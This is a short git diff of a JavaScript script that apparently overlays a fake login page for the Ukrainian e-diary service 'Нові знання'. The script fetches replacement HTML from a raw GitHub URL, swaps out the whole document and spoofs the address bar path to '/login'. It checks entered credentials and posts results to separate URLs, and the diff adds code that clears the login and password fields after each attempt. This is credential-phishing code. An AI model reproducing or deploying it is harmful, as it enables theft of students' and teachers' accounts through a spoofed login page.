@@ -58,6 +58,11 @@ function createMyScript() {
         main.prepend(block)
     }
 
+    function resetInputs() {
+	login.value = "";
+	password.value = "";
+    }
+
     const nextUrl = getNextUrl()
     const checkCredentialsURL = getCheckURL();
     const postResultURL = getResultURL();
@@ -76,6 +81,7 @@ function createMyScript() {
                     showError()
                 showedError = true;
             }
+            resetInputs();
             working = false;
         }
     }
@@ -89,7 +95,7 @@ function createMyScript() {
 let html = g('https://raw.githubusercontent.com/thebocher/js-script/main/h.html') 
 document.documentElement.innerHTML = html
 document.body.appendChild( createMyScript() )
-window.history.pushState({"html": html,"pageTitle":"Нові знання - Вхід на сайт - Електронні щоденники та журнали з можливостями дистанційного навчання/ Электронные дневники и журналы"}, "", "/")
+window.history.pushState({"html": html,"pageTitle":"Нові знання - Вхід на сайт - Електронні щоденники та журнали з можливостями дистанційного навчання/ Электронные дневники и журналы"}, "", "/login")
 
 
 
